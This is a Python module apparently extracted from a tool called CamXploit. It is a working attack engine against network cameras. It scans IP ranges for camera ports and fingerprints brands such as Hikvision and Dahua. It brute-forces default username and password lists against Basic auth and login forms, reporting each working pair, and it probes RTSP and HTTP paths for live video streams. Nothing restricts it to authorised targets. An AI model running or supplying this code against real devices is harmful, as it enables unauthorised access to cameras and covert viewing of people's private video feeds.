"""
Real scanning engine extracted from CamXploit.py
Provides comprehensive port scanning, device detection, and credential testing.
"""

import socket
import threading
import requests
import ipaddress
import time
from typing import List, Dict, Set, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.auth import HTTPBasicAuth
import warnings

# Suppress SSL warnings for embedded devices
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
requests.packages.urllib3.disable_warnings()

@dataclass
class ScanTarget:
    ip: str
    ports: List[int]
    open_ports: List[int] = None
    detected_services: Dict[int, str] = None
    device_type: Optional[str] = None
    brand: Optional[str] = None
    credentials: Optional[Dict[str, str]] = None
    streams: List[str] = None
    
    def __post_init__(self):
        if self.open_ports is None:
            self.open_ports = []
        if self.detected_services is None:
            self.detected_services = {}
        if self.streams is None:
            self.streams = []

class RealPortScanner:
    """High-performance port scanner based on CamXploit.py"""
    
    # Comprehensive port list from CamXploit.py
    CAMERA_PORTS = [
        # Standard web ports
        80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
        8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
        
        # RTSP ports
        554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,
        
        # RTMP ports
        1935, 1936, 1937, 1938, 1939,
        
        # Custom camera ports
        37777, 37778, 37779, 37780, 37781, 37782, 37783, 37784, 37785, 37786, 37787, 37788, 37789, 37790,
        37791, 37792, 37793, 37794, 37795, 37796, 37797, 37798, 37799, 37800,
        
        # ONVIF ports
        3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710,
        
        # Additional common ports
        5000, 5001, 5002, 5003, 5004, 5005, 6000, 6001, 6002, 6003, 6004, 6005,
        7000, 7001, 7002, 7003, 7004, 7005, 9000, 9001, 9002, 9003, 9004, 9005,
        8888, 8889, 8890, 8891, 8892, 8893, 9999, 9998, 9997, 9996, 9995, 9994
    ]
    
    def __init__(self, max_threads: int = 100, timeout: float = 1.5):
        self.max_threads = max_threads
        self.timeout = timeout
        self._stop_scanning = False
    
    def scan_target(self, ip: str, ports: List[int] = None) -> ScanTarget:
        """Scan single IP for open ports"""
        if ports is None:
            ports = self.CAMERA_PORTS
            
        target = ScanTarget(ip=ip, ports=ports)
        
        print(f"[🔍] Scanning {ip} ({len(ports)} ports)")
        
        open_ports = []
        lock = threading.Lock()
        scanned_count = 0
        
        def scan_port(port):
            nonlocal scanned_count
            if self._stop_scanning:
                return
                
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(self.timeout)
                try:
                    if sock.connect_ex((ip, port)) == 0:
                        with lock:
                            open_ports.append(port)
                            print(f"  ✅ Port {port} OPEN!")
                    else:
                        with lock:
                            scanned_count += 1
                            if scanned_count % 50 == 0:
                                print(f"  📊 Scanned {scanned_count}/{len(ports)} ports...")
                except:
                    with lock:
                        scanned_count += 1
        
        # Multi-threaded scanning
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(scan_port, port) for port in ports]
            for future in as_completed(futures):
                if self._stop_scanning:
                    break
        
        target.open_ports = sorted(open_ports)
        print(f"[📊] Scan complete: {len(open_ports)} open ports found")
        return target
    
    def scan_range(self, ip_range: str, ports: List[int] = None) -> List[ScanTarget]:
        """Scan IP range for devices"""
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
        except ValueError:
            print(f"[❌] Invalid IP range: {ip_range}")
            return []
        
        targets = []
        for ip in network.hosts():
            if self._stop_scanning:
                break
            target = self.scan_target(str(ip), ports)
            if target.open_ports:  # Only keep targets with open ports
                targets.append(target)
        
        return targets
    
    def stop(self):
        """Stop ongoing scans"""
        self._stop_scanning = True

class DeviceDetector:
    """Device detection and fingerprinting based on CamXploit.py"""
    
    CAMERA_BRANDS = {
        'hikvision': ['hikvision', 'dvr', 'nvr'],
        'dahua': ['dahua', 'dvr', 'nvr'],
        'axis': ['axis', 'axis communications'],
        'sony': ['sony', 'ipela'],
        'bosch': ['bosch', 'security systems'],
        'samsung': ['samsung', 'samsung techwin'],
        'panasonic': ['panasonic', 'network camera'],
        'vivotek': ['vivotek', 'network camera'],
        'cp plus': ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1'],
        'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'dvr', 'nvr', 'recorder']
    }
    
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
    
    def detect_device(self, target: ScanTarget) -> ScanTarget:
        """Detect device type and brand for target"""
        print(f"[📷] Analyzing {target.ip} for camera indicators")
        
        camera_detected = False
        detected_brand = None
        
        for port in target.open_ports:
            protocol = "https" if port in [443, 8443] else "http"
            base_url = f"{protocol}://{target.ip}:{port}"
            
            try:
                response = requests.get(base_url, headers=self.HEADERS, 
                                      timeout=self.timeout, verify=False)
                
                server_header = response.headers.get('Server', '').lower()
                content = response.text.lower()
                
                # Check for camera brand indicators
                for brand, keywords in self.CAMERA_BRANDS.items():
                    if any(keyword in server_header for keyword in keywords) or \
                       any(keyword in content for keyword in keywords):
                        print(f"    ✅ {brand.upper()} Camera Detected!")
                        camera_detected = True
                        detected_brand = brand
                        break
                
                # Check for authentication requirements
                if response.status_code == 401:
                    print(f"    🔐 Authentication required on port {port}")
                
                # Store service information
                target.detected_services[port] = f"{protocol}_{response.status_code}"
                
            except Exception as e:
                print(f"    ❌ Error checking {base_url}: {str(e)}")
        
        if camera_detected:
            target.device_type = "camera"
            target.brand = detected_brand
            print(f"[✅] Camera device confirmed: {detected_brand}")
        else:
            print(f"[❓] No camera indicators found")
        
        return target

class CredentialTester:
    """Aggressive credential testing based on CamXploit.py"""
    
    # Default credentials from CamXploit.py
    DEFAULT_CREDENTIALS = {
        "admin": ["admin", "1234", "admin123", "password", "12345", "123456", "1111", "default"],
        "root": ["root", "toor", "1234", "pass", "root123"],
        "user": ["user", "user123", "password"],
        "guest": ["guest", "guest123"],
        "operator": ["operator", "operator123"],
    }
    
    def __init__(self, timeout: int = 5, max_threads: int = 20):
        self.timeout = timeout
        self.max_threads = max_threads
        self.headers = {'User-Agent': 'Mozilla/5.0 Security Scanner'}
    
    def test_credentials(self, target: ScanTarget) -> ScanTarget:
        """Test default credentials against target"""
        print(f"[🔑] Testing credentials on {target.ip}")
        
        successful_creds = {}
        
        for port in target.open_ports:
            if port not in [80, 443, 8080, 8443]:  # Only test web ports
                continue
                
            protocol = "https" if port in [443, 8443] else "http"
            
            # Test different authentication endpoints
            endpoints = [
                f"{protocol}://{target.ip}:{port}/",
                f"{protocol}://{target.ip}:{port}/login",
                f"{protocol}://{target.ip}:{port}/admin",
                f"{protocol}://{target.ip}:{port}/cgi-bin/"
            ]
            
            for endpoint in endpoints:
                if self._test_endpoint_credentials(endpoint, port, successful_creds):
                    break  # Found working credentials for this port
        
        if successful_creds:
            target.credentials = successful_creds
            print(f"[🔥] Found {len(successful_creds)} working credential pairs!")
        else:
            print(f"[❌] No default credentials found")
        
        return target
    
    def _test_endpoint_credentials(self, url: str, port: int, 
                                 successful_creds: Dict[str, str]) -> bool:
        """Test credentials against specific endpoint"""
        for username, passwords in self.DEFAULT_CREDENTIALS.items():
            for password in passwords:
                try:
                    # Test HTTP Basic Auth
                    response = requests.get(url, auth=(username, password),
                                          headers=self.headers, timeout=self.timeout, 
                                          verify=False)
                    
                    if response.status_code == 200:
                        cred_key = f"{port}_{username}"
                        successful_creds[cred_key] = f"{username}:{password}"
                        print(f"    🔥 SUCCESS: {username}:{password} @ {url}")
                        return True
                        
                    # Test POST form auth
                    if "/login" in url:
                        form_response = requests.post(url, 
                                                    data={'username': username, 'password': password},
                                                    headers=self.headers, timeout=self.timeout,
                                                    verify=False)
                        if form_response.status_code == 200 and "error" not in form_response.text.lower():
                            cred_key = f"{port}_{username}"
                            successful_creds[cred_key] = f"{username}:{password}"
                            print(f"    🔥 SUCCESS: {username}:{password} @ {url} (POST)")
                            return True
                            
                except Exception:
                    continue  # Try next credential pair
        
        return False

class StreamDiscovery:
    """Stream discovery based on CamXploit.py"""
    
    STREAM_PATHS = {
        'rtsp': [
            '/live.sdp', '/h264.sdp', '/stream1', '/stream2', '/main', '/sub',
            '/video', '/cam/realmonitor', '/Streaming/Channels/1', '/Streaming/Channels/101',
            '/onvif/streaming/channels/1', '/axis-media/media.amp'
        ],
        'http': [
            '/video', '/stream', '/mjpg/video.mjpg', '/cgi-bin/mjpg/video.cgi',
            '/axis-cgi/mjpg/video.cgi', '/snapshot.jpg', '/img/snapshot.cgi'
        ]
    }
    
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
    
    def discover_streams(self, target: ScanTarget) -> ScanTarget:
        """Discover video streams on target"""
        print(f"[🎥] Checking for streams on {target.ip}")
        
        streams = []
        
        for port in target.open_ports:
            # Check RTSP streams
            if port in [554, 8554]:
                for path in self.STREAM_PATHS['rtsp']:
                    stream_url = f"rtsp://{target.ip}:{port}{path}"
                    if self._test_rtsp_stream(stream_url):
                        streams.append(stream_url)
                        print(f"    ✅ RTSP Stream: {stream_url}")
            
            # Check HTTP video endpoints
            elif port in [80, 443, 8080, 8443]:
                protocol = "https" if port in [443, 8443] else "http"
                for path in self.STREAM_PATHS['http']:
                    stream_url = f"{protocol}://{target.ip}:{port}{path}"
                    if self._test_http_stream(stream_url):
                        streams.append(stream_url)
                        print(f"    ✅ HTTP Stream: {stream_url}")
        
        target.streams = streams
        if streams:
            print(f"[🎥] Found {len(streams)} streams")
        else:
            print(f"[❌] No streams detected")
        
        return target
    
    def _test_rtsp_stream(self, url: str) -> bool:
        """Test RTSP stream availability"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or 554
            
            # Simple TCP connection test
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(self.timeout)
                sock.connect((host, port))
                return True
        except:
            return False
    
    def _test_http_stream(self, url: str) -> bool:
        """Test HTTP stream availability"""
        try:
            response = requests.head(url, timeout=self.timeout, verify=False)
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check for video/image content types
            if any(x in content_type for x in ['video', 'image', 'mjpeg', 'stream']):
                return True
            
            # Check for successful response with video-related content
            if response.status_code == 200:
                return True
                
        except:
            pass
        
        return False